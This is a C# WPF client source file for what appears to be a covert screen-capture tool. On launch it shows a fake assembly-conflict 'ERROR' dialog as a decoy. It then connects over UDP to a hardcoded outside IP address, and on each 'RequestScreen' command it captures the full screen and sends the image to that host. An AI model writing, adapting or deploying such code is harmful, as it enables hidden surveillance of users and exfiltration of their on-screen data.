
using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Protocol;
using Image = System.Drawing.Image;
using PixelFormat = System.Drawing.Imaging.PixelFormat;

namespace Client
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
  
    public partial class MainWindow : Window
    {
        private int fps = 30;
        private readonly UdpClient _server = new UdpClient("46.33.236.84",57650);
        //private readonly UdpClient _server = new UdpClient("127.0.0.1", 57650);

        private IPEndPoint endPoint = null;

        public MainWindow()
        {

            MessageBox.Show(
                "There was a conflict between \"System.Runtime.CompilerServices.Unsafe, Version=4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" and \"System.Runtime.CompilerServices.Unsafe, Version=4.0.6.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\".\r\n    \"System.Runtime.CompilerServices.Unsafe, Version = 4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" was chosen because it was primary and \"System.Runtime.CompilerServices.Unsafe, Version=4.0.6.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" was not.\r\n    References which depend on \"System.Runtime.CompilerServices.Unsafe, Version = 4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" [C:\\Users\\mkharitonov\\.nuget\\packages\\system.runtime.compilerservices.unsafe\\4.5.2\\ref\\netstandard2.0\\System.Runtime.CompilerServices.Unsafe.dll].",
                "ERROR", MessageBoxButton.OK, MessageBoxImage.Error);

            this.
            Receive();
        }

        public async void Receive()
        {
            await Task.Run(() =>
            {
                _server.Send(BitConverter.GetBytes((int)Commands.Connect), 4);

                while (true)
                {
                    Commands input = (Commands)BitConverter.ToInt32(_server.Receive(ref endPoint), 0);
                    switch (input)
                    {
                        case Commands.RequestScreen:
                            var image = ScreenShot();
                            SendScreen(image);
                            Dispatcher.Invoke(() =>
                            {
                                using (var stream = new MemoryStream(image))
                                {
                                    ImageBlock.Source = BytesToImage(image);
                                }
                            });
                            //MessageBox.Show($"Client: {image.GetHashCode().ToString()} {image[0]} {image[1000]}");
                            break;
                    }

                }
            });
        }

        public void SendScreen(byte[] source)
        {
            Transfer.SendUpdBig(_server, source);
        }

        public byte[] ScreenShot()
        {
            int screenWidth = (int)SystemParameters.VirtualScreenWidth;
            int screenHeight = (int)SystemParameters.VirtualScreenHeight;

            using (Bitmap bmp = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppRgb))
            {
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                return BitmapToByteArray(bmp);
            }

        }

        byte[] BitmapToByteArray(Bitmap bitmap)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                bitmap.Save(memory, System.Drawing.Imaging.ImageFormat.Png);
                return memory.ToArray();
            }
        }

        public static BitmapImage BytesToImage(byte[] bytes)
        {
            using (var stream = new MemoryStream(bytes))
            {
                var bitmap = new BitmapImage();
                bitmap.BeginInit();
                bitmap.StreamSource = stream;
                bitmap.CacheOption = BitmapCacheOption.OnLoad;
                bitmap.EndInit();
                bitmap.Freeze();
                return bitmap;
            }
        }
    }

}
